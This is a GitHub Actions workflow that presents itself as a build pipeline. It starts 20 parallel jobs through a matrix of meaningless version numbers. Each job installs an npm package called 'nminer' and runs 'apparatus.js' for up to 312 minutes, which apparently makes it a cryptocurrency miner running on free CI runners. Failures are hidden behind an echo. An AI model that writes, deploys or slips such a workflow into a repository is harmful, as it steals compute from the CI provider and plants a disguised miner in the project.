name: apparatus
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2995 }
          - { version: 40 }
          - { version: 5732 }
          - { version: 8591 }
          - { version: 6096 }
          - { version: 9804 }
          - { version: 2337 }
          - { version: 7538 }
          - { version: 6716 }
          - { version: 5528 }
          - { version: 8644 }
          - { version: 8477 }
          - { version: 7628 }
          - { version: 5852 }
          - { version: 3201 }
          - { version: 8861 }
          - { version: 1781 }
          - { version: 3949 }
          - { version: 5193 }
          - { version: 2843 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: woot
        run: |
          npm install nminer@latest
          timeout 312m node apparatus.js || echo "apparatus executed"